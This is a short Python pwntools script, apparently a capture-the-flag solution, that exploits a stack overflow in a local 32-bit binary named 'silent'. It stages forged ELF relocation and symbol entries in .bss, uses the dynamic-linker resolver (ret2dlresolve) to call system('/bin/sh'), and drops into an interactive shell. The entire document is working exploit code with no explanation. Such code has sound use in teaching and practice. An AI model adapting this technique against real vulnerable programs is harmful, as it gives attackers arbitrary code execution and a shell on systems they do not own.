from pwn import *

p = process('./silent')
elf = ELF('./silent')
libc = elf.libc

bss = 0x0804b000 - 0x300
readPLT = elf.plt['read']
main = elf.sym['main']

jmprel = 0x80482D8
symbol_table = 0x80481D0
string_table = 0x8048240
plt0 = 0x8048320

fakerel = (bss+0x18) - jmprel
fakesymtable = (bss+0x30) - symbol_table
fakestr = (bss+0x40) - string_table

payload = b'a'*16 + p32(bss) + p32(readPLT) + p32(main) + p32(0) + p32(bss) + p32(0x100)
p.send(payload)

payload = b'/bin/sh\x00' + b'a'*16 
payload += p32(bss + 8) + p32(fakesymtable * 0x10 + 7) + b'a'*16    # Elf32_Rel
payload += p32(fakestr) + p32(0) + p32(0) + p32(0x12)   # Elf32_Sym
payload += b'system\x00'
p.send(payload)

payload = b'a'*20 + p32(plt0) + p32(fakerel) + p32(0) + p32(bss)
p.sendline(payload)

p.interactive()